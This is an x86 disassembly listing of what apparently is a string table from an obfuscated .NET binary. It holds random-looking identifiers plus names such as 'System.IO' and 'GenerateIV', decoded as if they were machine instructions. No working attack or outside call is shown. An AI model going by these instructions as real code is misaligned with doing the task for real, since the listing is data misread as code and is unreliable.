  407c15:	59                   	pop    %ecx
  407c16:	67 50                	addr16 push %eax
  407c18:	4a                   	dec    %edx
  407c19:	00 6f 73             	add    %ch,0x73(%edi)
  407c1c:	6f                   	outsl  %ds:(%esi),(%dx)
  407c1d:	6e                   	outsb  %ds:(%esi),(%dx)
  407c1e:	76 48                	jbe    0x407c68
  407c20:	47                   	inc    %edi
  407c21:	46                   	inc    %esi
  407c22:	53                   	push   %ebx
  407c23:	74 68                	je     0x407c8d
  407c25:	53                   	push   %ebx
  407c26:	55                   	push   %ebp
  407c27:	6d                   	insl   (%dx),%es:(%edi)
  407c28:	4a                   	dec    %edx
  407c29:	00 72 6e             	add    %dh,0x6e(%edx)
  407c2c:	6e                   	outsb  %ds:(%esi),(%dx)
  407c2d:	56                   	push   %esi
  407c2e:	42                   	inc    %edx
  407c2f:	54                   	push   %esp
  407c30:	64 47                	fs inc %edi
  407c32:	6f                   	outsl  %ds:(%esi),(%dx)
  407c33:	4a                   	dec    %edx
  407c34:	00 7a 79             	add    %bh,0x79(%edx)
  407c37:	55                   	push   %ebp
  407c38:	6e                   	outsb  %ds:(%esi),(%dx)
  407c39:	43                   	inc    %ebx
  407c3a:	42                   	inc    %edx
  407c3b:	6e                   	outsb  %ds:(%esi),(%dx)
  407c3c:	5a                   	pop    %edx
  407c3d:	55                   	push   %ebp
  407c3e:	4e                   	dec    %esi
  407c3f:	6f                   	outsl  %ds:(%esi),(%dx)
  407c40:	70 4a                	jo     0x407c8c
  407c42:	00 72 61             	add    %dh,0x61(%edx)
  407c45:	47                   	inc    %edi
  407c46:	73 7a                	jae    0x407cc2
  407c48:	79 42                	jns    0x407c8c
  407c4a:	6d                   	insl   (%dx),%es:(%edi)
  407c4b:	76 4a                	jbe    0x407c97
  407c4d:	00 57 6e             	add    %dl,0x6e(%edi)
  407c50:	58                   	pop    %eax
  407c51:	6f                   	outsl  %ds:(%esi),(%dx)
  407c52:	4c                   	dec    %esp
  407c53:	46                   	inc    %esi
  407c54:	77 62                	ja     0x407cb8
  407c56:	70 73                	jo     0x407ccb
  407c58:	68 48 4b 00 4c       	push   $0x4c004b48
  407c5d:	72 72                	jb     0x407cd1
  407c5f:	6f                   	outsl  %ds:(%esi),(%dx)
  407c60:	46                   	inc    %esi
  407c61:	57                   	push   %edi
  407c62:	6d                   	insl   (%dx),%es:(%edi)
  407c63:	6c                   	insb   (%dx),%es:(%edi)
  407c64:	64 64 4e             	fs fs dec %esi
  407c67:	4b                   	dec    %ebx
  407c68:	00 74 6c 4a          	add    %dh,0x4a(%esp,%ebp,2)
  407c6c:	64 79 44             	fs jns 0x407cb3
  407c6f:	71 61                	jno    0x407cd2
  407c71:	6b 51 4b 00          	imul   $0x0,0x4b(%ecx),%edx
  407c75:	59                   	pop    %ecx
  407c76:	69 5a 62 49 4b 7a 61 	imul   $0x617a4b49,0x62(%edx),%ebx
  407c7d:	46                   	inc    %esi
  407c7e:	55                   	push   %ebp
  407c7f:	5a                   	pop    %edx
  407c80:	61                   	popa
  407c81:	4b                   	dec    %ebx
  407c82:	00 5a 45             	add    %bl,0x45(%edx)
  407c85:	42                   	inc    %edx
  407c86:	56                   	push   %esi
  407c87:	62 4e 63             	bound  %ecx,0x63(%esi)
  407c8a:	6d                   	insl   (%dx),%es:(%edi)
  407c8b:	73 64                	jae    0x407cf1
  407c8d:	4b                   	dec    %ebx
  407c8e:	00 6f 69             	add    %ch,0x69(%edi)
  407c91:	4b                   	dec    %ebx
  407c92:	67 6a 74             	addr16 push $0x74
  407c95:	59                   	pop    %ecx
  407c96:	50                   	push   %eax
  407c97:	44                   	inc    %esp
  407c98:	44                   	inc    %esp
  407c99:	4b                   	dec    %ebx
  407c9a:	69 42 6c 4b 00 4d 64 	imul   $0x644d004b,0x6c(%edx),%eax
  407ca1:	6e                   	outsb  %ds:(%esi),(%dx)
  407ca2:	46                   	inc    %esi
  407ca3:	4b                   	dec    %ebx
  407ca4:	4e                   	dec    %esi
  407ca5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ca6:	4c                   	dec    %esp
  407ca7:	77 59                	ja     0x407d02
  407ca9:	76 61                	jbe    0x407d0c
  407cab:	79 4b                	jns    0x407cf8
  407cad:	00 59 69             	add    %bl,0x69(%ecx)
  407cb0:	78 56                	js     0x407d08
  407cb2:	70 4a                	jo     0x407cfe
  407cb4:	43                   	inc    %ebx
  407cb5:	45                   	inc    %ebp
  407cb6:	46                   	inc    %esi
  407cb7:	43                   	inc    %ebx
  407cb8:	47                   	inc    %edi
  407cb9:	56                   	push   %esi
  407cba:	7a 4b                	jp     0x407d07
  407cbc:	00 4e 65             	add    %cl,0x65(%esi)
  407cbf:	4f                   	dec    %edi
  407cc0:	4a                   	dec    %edx
  407cc1:	56                   	push   %esi
  407cc2:	69 58 57 71 49 49 56 	imul   $0x56494971,0x57(%eax),%ebx
  407cc9:	44                   	inc    %esp
  407cca:	70 45                	jo     0x407d11
  407ccc:	4b                   	dec    %ebx
  407ccd:	4c                   	dec    %esp
  407cce:	00 65 4a             	add    %ah,0x4a(%ebp)
  407cd1:	75 69                	jne    0x407d3c
  407cd3:	70 4e                	jo     0x407d23
  407cd5:	54                   	push   %esp
  407cd6:	66 4c                	dec    %sp
  407cd8:	72 4f                	jb     0x407d29
  407cda:	4c                   	dec    %esp
  407cdb:	00 47 6a             	add    %al,0x6a(%edi)
  407cde:	61                   	popa
  407cdf:	53                   	push   %ebx
  407ce0:	65 64 56             	gs fs push %esi
  407ce3:	44                   	inc    %esp
  407ce4:	4c                   	dec    %esp
  407ce5:	66 71 51             	data16 jno 0x407d39
  407ce8:	4c                   	dec    %esp
  407ce9:	00 4c 6d 54          	add    %cl,0x54(%ebp,%ebp,2)
  407ced:	51                   	push   %ecx
  407cee:	54                   	push   %esp
  407cef:	4e                   	dec    %esi
  407cf0:	50                   	push   %eax
  407cf1:	62 64 4d 53          	bound  %esp,0x53(%ebp,%ecx,2)
  407cf5:	62 52 56             	bound  %edx,0x56(%edx)
  407cf8:	4c                   	dec    %esp
  407cf9:	00 71 77             	add    %dh,0x77(%ecx)
  407cfc:	53                   	push   %ebx
  407cfd:	42                   	inc    %edx
  407cfe:	54                   	push   %esp
  407cff:	48                   	dec    %eax
  407d00:	67 59                	addr16 pop %ecx
  407d02:	6a 6f                	push   $0x6f
  407d04:	58                   	pop    %eax
  407d05:	4c                   	dec    %esp
  407d06:	00 42 79             	add    %al,0x79(%edx)
  407d09:	64 5a                	fs pop %edx
  407d0b:	55                   	push   %ebp
  407d0c:	6f                   	outsl  %ds:(%esi),(%dx)
  407d0d:	46                   	inc    %esi
  407d0e:	6d                   	insl   (%dx),%es:(%edi)
  407d0f:	45                   	inc    %ebp
  407d10:	66 61                	popaw
  407d12:	4c                   	dec    %esp
  407d13:	00 63 59             	add    %ah,0x59(%ebx)
  407d16:	6d                   	insl   (%dx),%es:(%edi)
  407d17:	5a                   	pop    %edx
  407d18:	62 66 52             	bound  %esp,0x52(%esi)
  407d1b:	63 76 57             	arpl   %esi,0x57(%esi)
  407d1e:	6c                   	insb   (%dx),%es:(%edi)
  407d1f:	61                   	popa
  407d20:	4c                   	dec    %esp
  407d21:	00 49 4a             	add    %cl,0x4a(%ecx)
  407d24:	4b                   	dec    %ebx
  407d25:	6f                   	outsl  %ds:(%esi),(%dx)
  407d26:	4b                   	dec    %ebx
  407d27:	62 4c 4c 6d          	bound  %ecx,0x6d(%esp,%ecx,2)
  407d2b:	70 4c                	jo     0x407d79
  407d2d:	00 47 4b             	add    %al,0x4b(%edi)
  407d30:	52                   	push   %edx
  407d31:	44                   	inc    %esp
  407d32:	59                   	pop    %ecx
  407d33:	68 42 71 6d 77       	push   $0x776d7142
  407d38:	77 4c                	ja     0x407d86
  407d3a:	00 5a 70             	add    %bl,0x70(%edx)
  407d3d:	54                   	push   %esp
  407d3e:	63 44 79 4a          	arpl   %eax,0x4a(%ecx,%edi,2)
  407d42:	66 51                	push   %cx
  407d44:	73 61                	jae    0x407da7
  407d46:	43                   	inc    %ebx
  407d47:	78 4c                	js     0x407d95
  407d49:	00 70 78             	add    %dh,0x78(%eax)
  407d4c:	47                   	inc    %edi
  407d4d:	5a                   	pop    %edx
  407d4e:	64 5a                	fs pop %edx
  407d50:	78 66                	js     0x407db8
  407d52:	59                   	pop    %ecx
  407d53:	43                   	inc    %ebx
  407d54:	4d                   	dec    %ebp
  407d55:	00 74 4d 69          	add    %dh,0x69(%ebp,%ecx,2)
  407d59:	78 7a                	js     0x407dd5
  407d5b:	72 66                	jb     0x407dc3
  407d5d:	77 77                	ja     0x407dd6
  407d5f:	64 4d                	fs dec %ebp
  407d61:	00 4d 42             	add    %cl,0x42(%ebp)
  407d64:	47                   	inc    %edi
  407d65:	57                   	push   %edi
  407d66:	6d                   	insl   (%dx),%es:(%edi)
  407d67:	7a 43                	jp     0x407dac
  407d69:	70 6b                	jo     0x407dd6
  407d6b:	6b 4d 00 65          	imul   $0x65,0x0(%ebp),%ecx
  407d6f:	45                   	inc    %ebp
  407d70:	6f                   	outsl  %ds:(%esi),(%dx)
  407d71:	6d                   	insl   (%dx),%es:(%edi)
  407d72:	5a                   	pop    %edx
  407d73:	49                   	dec    %ecx
  407d74:	79 51                	jns    0x407dc7
  407d76:	73 53                	jae    0x407dcb
  407d78:	67 77 48             	addr16 ja 0x407dc3
  407d7b:	6b 77 4d 00          	imul   $0x0,0x4d(%edi),%esi
  407d7f:	6b 77 49 72          	imul   $0x72,0x49(%edi),%esi
  407d83:	51                   	push   %ecx
  407d84:	74 54                	je     0x407dda
  407d86:	6c                   	insb   (%dx),%es:(%edi)
  407d87:	45                   	inc    %ebp
  407d88:	73 41                	jae    0x407dcb
  407d8a:	4e                   	dec    %esi
  407d8b:	00 54 4e 4b          	add    %dl,0x4b(%esi,%ecx,2)
  407d8f:	79 59                	jns    0x407dea
  407d91:	41                   	inc    %ecx
  407d92:	58                   	pop    %eax
  407d93:	6d                   	insl   (%dx),%es:(%edi)
  407d94:	4d                   	dec    %ebp
  407d95:	44                   	inc    %esp
  407d96:	56                   	push   %esi
  407d97:	51                   	push   %ecx
  407d98:	59                   	pop    %ecx
  407d99:	68 44 4e 00 6e       	push   $0x6e004e44
  407d9e:	77 78                	ja     0x407e18
  407da0:	64 71 6f             	fs jno 0x407e12
  407da3:	46                   	inc    %esi
  407da4:	4b                   	dec    %ebx
  407da5:	68 6c 65 54 4e       	push   $0x4e54656c
  407daa:	00 53 79             	add    %dl,0x79(%ebx)
  407dad:	73 74                	jae    0x407e23
  407daf:	65 6d                	gs insl (%dx),%es:(%edi)
  407db1:	2e 49                	cs dec %ecx
  407db3:	4f                   	dec    %edi
  407db4:	00 7a 61             	add    %bh,0x61(%edx)
  407db7:	47                   	inc    %edi
  407db8:	7a 61                	jp     0x407e1b
  407dba:	61                   	popa
  407dbb:	4d                   	dec    %ebp
  407dbc:	71 61                	jno    0x407e1f
  407dbe:	50                   	push   %eax
  407dbf:	4f                   	dec    %edi
  407dc0:	00 62 49             	add    %ah,0x49(%edx)
  407dc3:	4c                   	dec    %esp
  407dc4:	65 61                	gs popa
  407dc6:	74 56                	je     0x407e1e
  407dc8:	55                   	push   %ebp
  407dc9:	50                   	push   %eax
  407dca:	50                   	push   %eax
  407dcb:	66 4f                	dec    %di
  407dcd:	00 65 68             	add    %ah,0x68(%ebp)
  407dd0:	78 67                	js     0x407e39
  407dd2:	74 69                	je     0x407e3d
  407dd4:	46                   	inc    %esi
  407dd5:	46                   	inc    %esi
  407dd6:	55                   	push   %ebp
  407dd7:	58                   	pop    %eax
  407dd8:	70 49                	jo     0x407e23
  407dda:	6f                   	outsl  %ds:(%esi),(%dx)
  407ddb:	4f                   	dec    %edi
  407ddc:	00 6a 4d             	add    %ch,0x4d(%edx)
  407ddf:	41                   	inc    %ecx
  407de0:	44                   	inc    %esp
  407de1:	50                   	push   %eax
  407de2:	70 64                	jo     0x407e48
  407de4:	42                   	inc    %edx
  407de5:	51                   	push   %ecx
  407de6:	50                   	push   %eax
  407de7:	00 43 5a             	add    %al,0x5a(%ebx)
  407dea:	45                   	inc    %ebp
  407deb:	75 73                	jne    0x407e60
  407ded:	57                   	push   %edi
  407dee:	52                   	push   %edx
  407def:	58                   	pop    %eax
  407df0:	52                   	push   %edx
  407df1:	6d                   	insl   (%dx),%es:(%edi)
  407df2:	45                   	inc    %ebp
  407df3:	65 42                	gs inc %edx
  407df5:	67 50                	addr16 push %eax
  407df7:	00 72 49             	add    %dh,0x49(%edx)
  407dfa:	77 62                	ja     0x407e5e
  407dfc:	4f                   	dec    %edi
  407dfd:	5a                   	pop    %edx
  407dfe:	49                   	dec    %ecx
  407dff:	65 68 54 4f 73 50    	gs push $0x50734f54
  407e05:	00 54 4d 65          	add    %dl,0x65(%ebp,%ecx,2)
  407e09:	49                   	dec    %ecx
  407e0a:	78 4c                	js     0x407e58
  407e0c:	48                   	dec    %eax
  407e0d:	73 51                	jae    0x407e60
  407e0f:	50                   	push   %eax
  407e10:	68 51 51 00 57       	push   $0x57005151
  407e15:	6f                   	outsl  %ds:(%esi),(%dx)
  407e16:	57                   	push   %edi
  407e17:	57                   	push   %edi
  407e18:	72 63                	jb     0x407e7d
  407e1a:	4b                   	dec    %ebx
  407e1b:	4b                   	dec    %ebx
  407e1c:	50                   	push   %eax
  407e1d:	49                   	dec    %ecx
  407e1e:	66 4a                	dec    %dx
  407e20:	6a 57                	push   $0x57
  407e22:	61                   	popa
  407e23:	51                   	push   %ecx
  407e24:	00 6e 70             	add    %ch,0x70(%esi)
  407e27:	52                   	push   %edx
  407e28:	66 59                	pop    %cx
  407e2a:	6e                   	outsb  %ds:(%esi),(%dx)
  407e2b:	62 68 69             	bound  %ebp,0x69(%eax)
  407e2e:	6d                   	insl   (%dx),%es:(%edi)
  407e2f:	51                   	push   %ecx
  407e30:	00 53 62             	add    %dl,0x62(%ebx)
  407e33:	59                   	pop    %ecx
  407e34:	66 57                	push   %di
  407e36:	43                   	inc    %ebx
  407e37:	50                   	push   %eax
  407e38:	50                   	push   %eax
  407e39:	79 68                	jns    0x407ea3
  407e3b:	77 4e                	ja     0x407e8b
  407e3d:	73 51                	jae    0x407e90
  407e3f:	00 6f 4b             	add    %ch,0x4b(%edi)
  407e42:	47                   	inc    %edi
  407e43:	55                   	push   %ebp
  407e44:	6e                   	outsb  %ds:(%esi),(%dx)
  407e45:	4e                   	dec    %esi
  407e46:	49                   	dec    %ecx
  407e47:	69 54 43 74 51 00 61 	imul   $0x44610051,0x74(%ebx,%eax,2),%edx
  407e4e:	44 
  407e4f:	6c                   	insb   (%dx),%es:(%edi)
  407e50:	70 71                	jo     0x407ec3
  407e52:	58                   	pop    %eax
  407e53:	73 4d                	jae    0x407ea2
  407e55:	68 6f 47 52 00       	push   $0x52476f
  407e5a:	49                   	dec    %ecx
  407e5b:	45                   	inc    %ebp
  407e5c:	63 66 6e             	arpl   %esp,0x6e(%esi)
  407e5f:	59                   	pop    %ecx
  407e60:	41                   	inc    %ecx
  407e61:	64 45                	fs inc %ebp
  407e63:	64 49                	fs dec %ecx
  407e65:	52                   	push   %edx
  407e66:	00 4c 61 6d          	add    %cl,0x6d(%ecx,%eiz,2)
  407e6a:	66 76 61             	data16 jbe 0x407ece
  407e6d:	4f                   	dec    %edi
  407e6e:	7a 77                	jp     0x407ee7
  407e70:	79 63                	jns    0x407ed5
  407e72:	52                   	push   %edx
  407e73:	00 4e 73             	add    %cl,0x73(%esi)
  407e76:	4d                   	dec    %ebp
  407e77:	6c                   	insb   (%dx),%es:(%edi)
  407e78:	6a 53                	push   $0x53
  407e7a:	61                   	popa
  407e7b:	48                   	dec    %eax
  407e7c:	74 66                	je     0x407ee4
  407e7e:	67 52                	addr16 push %edx
  407e80:	00 46 74             	add    %al,0x74(%esi)
  407e83:	7a 49                	jp     0x407ece
  407e85:	76 6e                	jbe    0x407ef5
  407e87:	48                   	dec    %eax
  407e88:	6e                   	outsb  %ds:(%esi),(%dx)
  407e89:	43                   	inc    %ebx
  407e8a:	53                   	push   %ebx
  407e8b:	00 6d 49             	add    %ch,0x49(%ebp)
  407e8e:	54                   	push   %esp
  407e8f:	4b                   	dec    %ebx
  407e90:	6a 52                	push   $0x52
  407e92:	55                   	push   %ebp
  407e93:	71 42                	jno    0x407ed7
  407e95:	6b 4b 45 46          	imul   $0x46,0x45(%ebx),%ecx
  407e99:	49                   	dec    %ecx
  407e9a:	52                   	push   %edx
  407e9b:	53                   	push   %ebx
  407e9c:	00 6f 42             	add    %ch,0x42(%edi)
  407e9f:	48                   	dec    %eax
  407ea0:	65 6a 6c             	gs push $0x6c
  407ea3:	44                   	inc    %esp
  407ea4:	4c                   	dec    %esp
  407ea5:	66 6b 53 53 00       	imul   $0x0,0x53(%ebx),%dx
  407eaa:	43                   	inc    %ebx
  407eab:	78 64                	js     0x407f11
  407ead:	44                   	inc    %esp
  407eae:	4d                   	dec    %ebp
  407eaf:	56                   	push   %esi
  407eb0:	77 44                	ja     0x407ef6
  407eb2:	53                   	push   %ebx
  407eb3:	74 79                	je     0x407f2e
  407eb5:	5a                   	pop    %edx
  407eb6:	53                   	push   %ebx
  407eb7:	00 6c 74 78          	add    %ch,0x78(%esp,%esi,2)
  407ebb:	62 78 44             	bound  %edi,0x44(%eax)
  407ebe:	69 54 77 62 53 00 41 	imul   $0x49410053,0x62(%edi,%esi,2),%edx
  407ec5:	49 
  407ec6:	43                   	inc    %ebx
  407ec7:	54                   	push   %esp
  407ec8:	5a                   	pop    %edx
  407ec9:	6a 45                	push   $0x45
  407ecb:	71 46                	jno    0x407f13
  407ecd:	6a 53                	push   $0x53
  407ecf:	00 4c 4d 50          	add    %cl,0x50(%ebp,%ecx,2)
  407ed3:	65 41                	gs inc %ecx
  407ed5:	69 4b 72 42 6e 53 00 	imul   $0x536e42,0x72(%ebx),%ecx
  407edc:	6a 65                	push   $0x65
  407ede:	77 64                	ja     0x407f44
  407ee0:	72 42                	jb     0x407f24
  407ee2:	44                   	inc    %esp
  407ee3:	68 73 53 00 4f       	push   $0x4f005373
  407ee8:	71 63                	jno    0x407f4d
  407eea:	51                   	push   %ecx
  407eeb:	42                   	inc    %edx
  407eec:	6d                   	insl   (%dx),%es:(%edi)
  407eed:	53                   	push   %ebx
  407eee:	77 73                	ja     0x407f63
  407ef0:	53                   	push   %ebx
  407ef1:	00 46 51             	add    %al,0x51(%esi)
  407ef4:	45                   	inc    %ebp
  407ef5:	6e                   	outsb  %ds:(%esi),(%dx)
  407ef6:	70 6c                	jo     0x407f64
  407ef8:	70 6e                	jo     0x407f68
  407efa:	47                   	inc    %edi
  407efb:	58                   	pop    %eax
  407efc:	48                   	dec    %eax
  407efd:	45                   	inc    %ebp
  407efe:	79 53                	jns    0x407f53
  407f00:	00 78 6e             	add    %bh,0x6e(%eax)
  407f03:	62 6d 41             	bound  %ebp,0x41(%ebp)
  407f06:	6d                   	insl   (%dx),%es:(%edi)
  407f07:	44                   	inc    %esp
  407f08:	67 5a                	addr16 pop %edx
  407f0a:	69 44 54 00 6e 77 42 	imul   $0x7042776e,0x0(%esp,%edx,2),%eax
  407f11:	70 
  407f12:	69 79 78 67 74 62 78 	imul   $0x78627467,0x78(%ecx),%edi
  407f19:	49                   	dec    %ecx
  407f1a:	54                   	push   %esp
  407f1b:	70 55                	jo     0x407f72
  407f1d:	49                   	dec    %ecx
  407f1e:	54                   	push   %esp
  407f1f:	00 67 78             	add    %ah,0x78(%edi)
  407f22:	50                   	push   %eax
  407f23:	49                   	dec    %ecx
  407f24:	56                   	push   %esi
  407f25:	6f                   	outsl  %ds:(%esi),(%dx)
  407f26:	63 76 49             	arpl   %esi,0x49(%esi)
  407f29:	54                   	push   %esp
  407f2a:	00 65 70             	add    %ah,0x70(%ebp)
  407f2d:	63 50 54             	arpl   %edx,0x54(%eax)
  407f30:	54                   	push   %esp
  407f31:	77 79                	ja     0x407fac
  407f33:	6b 4b 54 00          	imul   $0x0,0x54(%ebx),%ecx
  407f37:	65 51                	gs push %ecx
  407f39:	6e                   	outsb  %ds:(%esi),(%dx)
  407f3a:	74 4e                	je     0x407f8a
  407f3c:	58                   	pop    %eax
  407f3d:	6c                   	insb   (%dx),%es:(%edi)
  407f3e:	46                   	inc    %esi
  407f3f:	46                   	inc    %esi
  407f40:	77 70                	ja     0x407fb2
  407f42:	45                   	inc    %ebp
  407f43:	74 61                	je     0x407fa6
  407f45:	4f                   	dec    %edi
  407f46:	54                   	push   %esp
  407f47:	00 4d 6e             	add    %cl,0x6e(%ebp)
  407f4a:	53                   	push   %ebx
  407f4b:	45                   	inc    %ebp
  407f4c:	53                   	push   %ebx
  407f4d:	41                   	inc    %ecx
  407f4e:	59                   	pop    %ecx
  407f4f:	71 6f                	jno    0x407fc0
  407f51:	6d                   	insl   (%dx),%es:(%edi)
  407f52:	52                   	push   %edx
  407f53:	54                   	push   %esp
  407f54:	00 41 6e             	add    %al,0x6e(%ecx)
  407f57:	7a 65                	jp     0x407fbe
  407f59:	55                   	push   %ebp
  407f5a:	74 66                	je     0x407fc2
  407f5c:	51                   	push   %ecx
  407f5d:	4e                   	dec    %esi
  407f5e:	49                   	dec    %ecx
  407f5f:	74 62                	je     0x407fc3
  407f61:	54                   	push   %esp
  407f62:	00 73 55             	add    %dh,0x55(%ebx)
  407f65:	4e                   	dec    %esi
  407f66:	47                   	inc    %edi
  407f67:	50                   	push   %eax
  407f68:	77 55                	ja     0x407fbf
  407f6a:	73 66                	jae    0x407fd2
  407f6c:	4f                   	dec    %edi
  407f6d:	44                   	inc    %esp
  407f6e:	65 54                	gs push %esp
  407f70:	00 47 50             	add    %al,0x50(%edi)
  407f73:	6e                   	outsb  %ds:(%esi),(%dx)
  407f74:	71 51                	jno    0x407fc7
  407f76:	6e                   	outsb  %ds:(%esi),(%dx)
  407f77:	41                   	inc    %ecx
  407f78:	77 4d                	ja     0x407fc7
  407f7a:	6a 4f                	push   $0x4f
  407f7c:	6c                   	insb   (%dx),%es:(%edi)
  407f7d:	54                   	push   %esp
  407f7e:	00 70 64             	add    %dh,0x64(%eax)
  407f81:	73 44                	jae    0x407fc7
  407f83:	75 58                	jne    0x407fdd
  407f85:	42                   	inc    %edx
  407f86:	71 70                	jno    0x407ff8
  407f88:	57                   	push   %edi
  407f89:	72 41                	jb     0x407fcc
  407f8b:	55                   	push   %ebp
  407f8c:	00 4f 45             	add    %cl,0x45(%edi)
  407f8f:	4b                   	dec    %ebx
  407f90:	61                   	popa
  407f91:	52                   	push   %edx
  407f92:	79 6e                	jns    0x408002
  407f94:	6c                   	insb   (%dx),%es:(%edi)
  407f95:	7a 6a                	jp     0x408001
  407f97:	6a 4d                	push   $0x4d
  407f99:	55                   	push   %ebp
  407f9a:	00 75 5a             	add    %dh,0x5a(%ebp)
  407f9d:	42                   	inc    %edx
  407f9e:	69 53 4a 67 67 4f 65 	imul   $0x654f6767,0x4a(%ebx),%edx
  407fa5:	52                   	push   %edx
  407fa6:	55                   	push   %ebp
  407fa7:	00 45 4a             	add    %al,0x4a(%ebp)
  407faa:	6a 56                	push   $0x56
  407fac:	54                   	push   %esp
  407fad:	45                   	inc    %ebp
  407fae:	78 4a                	js     0x407ffa
  407fb0:	63 53 55             	arpl   %edx,0x55(%ebx)
  407fb3:	00 76 5a             	add    %dh,0x5a(%esi)
  407fb6:	47                   	inc    %edi
  407fb7:	6a 65                	push   $0x65
  407fb9:	73 72                	jae    0x40802d
  407fbb:	45                   	inc    %ebp
  407fbc:	4e                   	dec    %esi
  407fbd:	45                   	inc    %ebp
  407fbe:	58                   	pop    %eax
  407fbf:	55                   	push   %ebp
  407fc0:	00 4f 48             	add    %cl,0x48(%edi)
  407fc3:	57                   	push   %edi
  407fc4:	4e                   	dec    %esi
  407fc5:	53                   	push   %ebx
  407fc6:	6f                   	outsl  %ds:(%esi),(%dx)
  407fc7:	46                   	inc    %esi
  407fc8:	6e                   	outsb  %ds:(%esi),(%dx)
  407fc9:	70 51                	jo     0x40801c
  407fcb:	46                   	inc    %esi
  407fcc:	72 55                	jb     0x408023
  407fce:	00 4b 50             	add    %cl,0x50(%ebx)
  407fd1:	68 6b 4f 6c 47       	push   $0x476c4f6b
  407fd6:	4e                   	dec    %esi
  407fd7:	77 55                	ja     0x40802e
  407fd9:	00 4a 73             	add    %cl,0x73(%edx)
  407fdc:	5a                   	pop    %edx
  407fdd:	72 73                	jb     0x408052
  407fdf:	78 79                	js     0x40805a
  407fe1:	72 55                	jb     0x408038
  407fe3:	59                   	pop    %ecx
  407fe4:	78 55                	js     0x40803b
  407fe6:	00 67 65             	add    %ah,0x65(%edi)
  407fe9:	74 5f                	je     0x40804a
  407feb:	49                   	dec    %ecx
  407fec:	56                   	push   %esi
  407fed:	00 73 65             	add    %dh,0x65(%ebx)
  407ff0:	74 5f                	je     0x408051
  407ff2:	49                   	dec    %ecx
  407ff3:	56                   	push   %esi
  407ff4:	00 47 65             	add    %al,0x65(%edi)
  407ff7:	6e                   	outsb  %ds:(%esi),(%dx)
  407ff8:	65 72 61             	gs jb  0x40805c
  407ffb:	74 65                	je     0x408062
  407ffd:	49                   	dec    %ecx
  407ffe:	56                   	push   %esi
  407fff:	00 4e 4b             	add    %cl,0x4b(%esi)
  408002:	73 78                	jae    0x40807c
  408004:	63 70 6c             	arpl   %esi,0x6c(%eax)
  408007:	45                   	inc    %ebp
  408008:	75 65                	jne    0x40806f
  40800a:	77 49                	ja     0x408055
  40800c:	6c                   	insb   (%dx),%es:(%edi)
  40800d:	56                   	push   %esi
  40800e:	00 7a 46             	add    %bh,0x46(%edx)
  408011:	50                   	push   %eax
  408012:	66 43                	inc    %bx
  408014:	61                   	popa
  408015:	51                   	push   %ecx
  408016:	59                   	pop    %ecx
  408017:	4c                   	dec    %esp
  408018:	54                   	push   %esp
  408019:	72 58                	jb     0x408073
  40801b:	52                   	push   %edx
  40801c:	78 73                	js     0x408091
  40801e:	56                   	push   %esi
  40801f:	00 6e 49             	add    %ch,0x49(%esi)
  408022:	6d                   	insl   (%dx),%es:(%edi)
  408023:	56                   	push   %esi
  408024:	52                   	push   %edx
  408025:	58                   	pop    %eax
  408026:	72 56                	jb     0x40807e
  408028:	48                   	dec    %eax
  408029:	45                   	inc    %ebp
  40802a:	57                   	push   %edi
  40802b:	00 67 61             	add    %ah,0x61(%edi)
  40802e:	58                   	pop    %eax
  40802f:	66 6e                	data16 outsb %ds:(%esi),(%dx)
  408031:	6e                   	outsb  %ds:(%esi),(%dx)
  408032:	49                   	dec    %ecx
  408033:	75 62                	jne    0x408097
  408035:	52                   	push   %edx
  408036:	79 53                	jns    0x40808b
  408038:	57                   	push   %edi
  408039:	00 50 75             	add    %dl,0x75(%eax)
  40803c:	79 6b                	jns    0x4080a9
  40803e:	65 54                	gs push %esp
  408040:	6a 50                	push   $0x50
  408042:	66 63 43 78          	arpl   %ax,0x78(%ebx)
  408046:	62 57 00             	bound  %edx,0x0(%edi)
  408049:	67 54                	addr16 push %esp
  40804b:	4e                   	dec    %esi
  40804c:	72 42                	jb     0x408090
  40804e:	50                   	push   %eax
  40804f:	4a                   	dec    %edx
  408050:	6e                   	outsb  %ds:(%esi),(%dx)
  408051:	5a                   	pop    %edx
  408052:	77 65                	ja     0x4080b9
  408054:	4d                   	dec    %ebp
  408055:	6b 4a 63 57          	imul   $0x57,0x63(%edx),%ecx
  408059:	00 73 4f             	add    %dh,0x4f(%ebx)
  40805c:	44                   	inc    %esp
  40805d:	75 50                	jne    0x4080af
  40805f:	49                   	dec    %ecx
  408060:	69 54 6e 52 77 68 57 	imul   $0x576877,0x52(%esi,%ebp,2),%edx
  408067:	00 
  408068:	55                   	push   %ebp
  408069:	6e                   	outsb  %ds:(%esi),(%dx)
  40806a:	4f                   	dec    %edi
  40806b:	53                   	push   %ebx
  40806c:	61                   	popa
  40806d:	53                   	push   %ebx
  40806e:	52                   	push   %edx
  40806f:	55                   	push   %ebp
  408070:	48                   	dec    %eax
  408071:	53                   	push   %ebx
  408072:	75 57                	jne    0x4080cb
  408074:	00 7a 76             	add    %bh,0x76(%edx)
  408077:	7a 61                	jp     0x4080da
  408079:	62 67 7a             	bound  %esp,0x7a(%edi)
  40807c:	79 66                	jns    0x4080e4
  40807e:	57                   	push   %edi
  40807f:	58                   	pop    %eax
  408080:	00 6c 7a 79          	add    %ch,0x79(%edx,%edi,2)
  408084:	79 6c                	jns    0x4080f2
  408086:	4d                   	dec    %ebp
  408087:	56                   	push   %esi
  408088:	6c                   	insb   (%dx),%es:(%edi)
  408089:	51                   	push   %ecx
  40808a:	53                   	push   %ebx
  40808b:	51                   	push   %ecx
  40808c:	48                   	dec    %eax
  40808d:	58                   	pop    %eax
  40808e:	4f                   	dec    %edi
  40808f:	65 58                	gs pop %eax
  408091:	00 74 42 47          	add    %dh,0x47(%edx,%eax,2)
  408095:	49                   	dec    %ecx
  408096:	4f                   	dec    %edi
  408097:	43                   	inc    %ebx
  408098:	4d                   	dec    %ebp
  408099:	53                   	push   %ebx
  40809a:	51                   	push   %ecx
  40809b:	6c                   	insb   (%dx),%es:(%edi)
  40809c:	73 56                	jae    0x4080f4
  40809e:	70 58                	jo     0x4080f8
  4080a0:	00 61 7a             	add    %ah,0x7a(%ecx)
  4080a3:	53                   	push   %ebx
  4080a4:	71 4f                	jno    0x4080f5
  4080a6:	55                   	push   %ebp
  4080a7:	75 4c                	jne    0x4080f5
  4080a9:	6b 79 72 58          	imul   $0x58,0x72(%ecx),%edi
  4080ad:	00 46 76             	add    %al,0x76(%esi)
  4080b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4080b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4080b2:	4d                   	dec    %ebp
